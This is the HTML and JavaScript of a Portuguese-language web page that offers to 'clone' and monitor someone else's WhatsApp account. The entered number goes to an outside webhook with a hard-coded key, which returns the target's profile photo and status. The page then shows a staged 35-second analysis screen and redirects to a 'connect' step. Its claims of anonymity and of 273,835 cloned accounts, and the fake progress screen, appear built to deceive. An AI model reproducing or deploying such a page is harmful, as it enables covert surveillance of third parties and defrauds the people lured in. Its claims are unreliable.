<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="Monitore o n√∫mero do seu alvo >aqui agora<">
    <title>APP Espi√£o 3.0 ü•á - Whatsapp Web</title>
    <link rel="icon" href="images/TLnoeYgsp26M.webp" type="image/x-icon" sizes="any">

    <!-- CSS -->
    <link rel="stylesheet" href="css/Xp6n21LyJCAL.css">
    <link rel="stylesheet" href="css/vVtaLWQieFp1.css" crossorigin="anonymous">
    <link rel="stylesheet" href="css/Xp6n21LyJCAL.css" data-precedence="next">

    <!-- Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com/">
    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">

    <!-- Scripts -->
    <script src="js/Qk15aYvjIBYB.js"></script>
    <script src="js/GCtl7lxdFO3O.js"></script>

    <style>
        .hidden {
            display: none;
        }

        .error-message {
            color: red;
            font-weight: bold;
        }
    </style>
</head>

<body class="bg-white" onselectstart="return false" ondragstart="return false" oncontextmenu="return false" oncopy="return false">
    <main class="bg-white">
        <header class="w-full bg-[#2AA884] h-[85px] flex items-center justify-center">
            <h1 class="text-xl"></h1>
        </header>

        <div class="flex items-center justify-center w-full">
            <div class="bg-white flex-col max-w-[960px] w-full p-4 min-h-[400px] rounded-md -mt-5 flex items-center justify-center">
                <img src="images/Whatsapp%20Icon.png" alt="Whatsapp" class="w-[400px] mobile:w-[250px]">
                <br>
                <h1 class="text-center text-[#41525D] text-xl mb-5">
                    Introduza o n√∫mero de telefone <b>WhatsApp que pretende clonar</b>
                </h1>

                <div class="flex flex-col w-full gap-4 mb-3 max-w-lg">
                    <form id="whatsappForm">
                        <div class="flex flex-col w-full mb-4 gap-4">
                            <div class="flex gap-3">
                                <div class="max-w-[150px] pr-8 placeholder:text-[#ADADAD] flex items-center gap-1 text-black bg-[#EFF2F5] rounded-md px-4 py-2">
                                    <input placeholder="+55" maxlength="3" class="bg-transparent max-w-[30px]" type="text" value="+55">
                                    <img src="images/ndQQml1TCAvX.svg" class="w-6">
                                </div>
                                <input type="tel" id="telefone" name="celular" placeholder="N√∫mero do WhatsApp aqui" required maxlength="15" class="phone w-full placeholder:text-[#ADADAD] text-black bg-[#EFF2F5] rounded-md px-4 py-2">
                            </div>

                            <div class="flex justify-center flex-col text-center">
                                <span class="text-[#41525D] text-sm font-light">Verifique se o n√∫mero est√° correto antes de clonar. </span>
                                <span id="error-zap" class="hidden error-message"></span>
                            </div>
                        </div>
                        <button type="submit" class="botao bg-[#218C7E] rounded-md text-white px-4 py-2 font-bold text-lg mt-4 disabled:opacity-90">Clonar WhatsApp</button>
                    </form>
                </div>

                <span class="text-[#41525D] text-sm font-light">*Esta ferramenta √© 100% an√¥nima*</span>

                <div>
                    <div class="grid grid-cols-4 mobile:grid-cols-2 gap-4 mb- mt-4">
                        <div class="flex items-center justify-center flex-col text-center">
                            <img src="images/Lh3KRAFamzz0.svg" alt="Android" class="w-6">
                            <span class="text-[#717171] font-bold">Android</span>
                        </div>
                        <div class="flex items-center justify-center flex-col text-center">
                            <img src="images/JsLC6wyXyFKo.svg" alt="iPhone" class="w-6">
                            <span class="text-[#717171] font-bold">iPhone</span>
                        </div>
                        <div class="flex items-center justify-center flex-col text-center">
                            <img src="images/WwaJOAEZMIKp.svg" alt="Mac e Windows" class="w-6">
                            <span class="text-[#717171] font-bold">Mac e Windows</span>
                        </div>
                        <div class="flex items-center justify-center flex-col text-center">
                            <img src="images/sKMYOqJPEln5.svg" alt="Windows Phone" class="w-6">
                            <span class="text-[#717171] font-bold">Windows Phone</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="w-full flex items-center justify-center">
            <div class="flex mobile:flex-col max-w-[960px] w-full items-center justify-between mt-5 gap-3">
                <div class="w-[90%] bg-[#EEF7F5] text-black rounded-md p-2 text-write flex items-center justify-center flex-col text-center">
                    <h1 class="font-bold ">Total de Whatsapp Clonados</h1>
                    <h3>273.835</h3>
                </div>
                <div class="w-[90%] rounded-md bg-[#F9F7EB] p-2 text-black flex items-center justify-center flex-col text-center">
                    <h1 class="font-bold ">Ferramenta Atualizada em:</h1>
                    <h3 class="ne1" id="currentDate"></h3>
                    <script>
                        const currentDateElement = document.getElementById('currentDate');
                        const currentDate = new Date().toLocaleDateString('pt-BR');
                        currentDateElement.textContent = currentDate;
                    </script>
                </div>
            </div>
        </div>

    </main>

    <!-- External Scripts -->
    <script src="js/jquery-3.5.1.min.js"></script>
    <script src="js/jquery.inputmask.min.js"></script>
    <script src="js/popper.min.js"></script>
    <script src="js/bootstrap.min.js"></script>

    <!-- Form Handling Script -->
    <script>
        document.getElementById("whatsappForm").addEventListener("submit", async function (e) {
            e.preventDefault();
            var numero = "+55" + document.getElementById("telefone").value.trim().replace(/[\s()-]/g, '');

            var progressBar = document.createElement('div');
            progressBar.classList.add('containAll');
            progressBar.style.position = 'fixed';
            progressBar.style.top = '0';
            progressBar.style.left = '0';
            progressBar.style.width = '100%';
            progressBar.style.height = '100%';
            progressBar.style.backgroundColor = 'rgba(255, 255, 255, 0.9)';
            progressBar.style.display = 'flex';
            progressBar.style.justifyContent = 'center';
            progressBar.style.alignItems = 'center';
            progressBar.innerHTML = `
                <div class="containLoader" style="color: rgba(42, 168, 132, 1); text-align: center; text-shadow: 1px 1px 2px #2AA884; filter: brightness(0.8);">
                    <div class="circleGroup circle-1"></div>
                    <div class="circleGroup circle-2"></div>
                    <div class="circleGroup circle-3"></div>
                    <div class="circleGroup circle-4"></div>
                    <div class="circleGroup circle-5"></div>
                    <div class="circleGroup circle-6"></div>
                    <div class="circleGroup circle-7"></div>
                    <div class="circleGroup circle-8"></div>
                    <div class="innerText" style="font-weight: bold; font-size: 1.5em;">
                        <p style="margin: 0; animation: pulse 1s infinite;">AGUARDE...<br>ANALISANDO O N√öMERO...</p>
                        <img src="images/loading.gif" alt="Loading GIF" style="width: 50%; display: block; margin: 10px auto;">
                    </div>
                </div>
            `;
            document.body.appendChild(progressBar);

            setTimeout(() => {
                progressBar.remove();
            }, 35000);

            var url = "https://w.imagens.pics/webhook/bc07";
            var headers = {
                "Content-Type": "application/json",
                "key": "wuAsuKHImXennBSFjt895tu984ut5"
            };
            var body = JSON.stringify({
                number: numero
            });

            try {
                const response = await fetch(url, {
                    method: "POST",
                    headers: headers,
                    body: body
                });
                fotoperfil = "https://i.postimg.cc/gcNd6QBM/img1.jpg";

                const data = await response.json();
                console.log('Dados recebidos:', data); // Debug log

                var fotoperfil = data.foto || "https://i.postimg.cc/gcNd6QBM/img1.jpg";
                var Status = data.about || "Disponivel";

                console.log('Foto de perfil:', fotoperfil); // Debug log
                console.log('Status:', Status); // Debug log

                localStorage.setItem("fotoperfil", fotoperfil);
                localStorage.setItem("Status", Status);

                setTimeout(() => {
                    window.location.href = "conectar.html?numero=" + numero;
                }, 3000);
            } catch (error) {
                console.error('Error:', error);
                localStorage.setItem("fotoperfil", "https://i.postimg.cc/gcNd6QBM/img1.jpg");
                localStorage.setItem("Status", "Disponivel");
                document.getElementById("error-zap").innerText = "N√∫mero n√£o encontrado, tente novamente.";
                document.getElementById("error-zap").classList.remove("hidden");

                // Wait 2 seconds and try to fetch the photo again
                setTimeout(async () => {
                    const retryResponse = await fetch(url, {
                        method: "POST",
                        headers: headers,
                        body: body
                    });
                    const retryData = await retryResponse.json();
                    var retryFotoperfil = retryData.foto || "https://i.postimg.cc/gcNd6QBM/img1.jpg";
                    var retryStatus = retryData.about || "Disponivel";

                    console.log('Retry Foto de perfil:', retryFotoperfil); // Debug log
                    console.log('Retry Status:', retryStatus); // Debug log

                    localStorage.setItem("fotoperfil", retryFotoperfil);
                    localStorage.setItem("Status", retryStatus);
                }, 2000);
            }
        });
    </script>

    <!-- Phone Mask Script -->
    <script>
        /* M√°scaras ER */
        function mascara(o, f) {
            v_obj = o
            v_fun = f
            setTimeout("execmascara()", 1)
        }

        function execmascara() {
            v_obj.value = v_fun(v_obj.value)
        }

        function mtel(v) {
            v = v.replace(/\D/g, ""); 
            v = v.replace(/^(\d{2})(\d)/g, "($1) $2");
            v = v.replace(/(\d)(\d{4})$/, "$1-$2"); 
            return v;
        }

        function id(el) {
            return document.getElementById(el);
        }
        window.onload = function () {
            id('telefone').onkeyup = function () {
                mascara(this, mtel);
            }
        }
    </script>

</body>

</html>
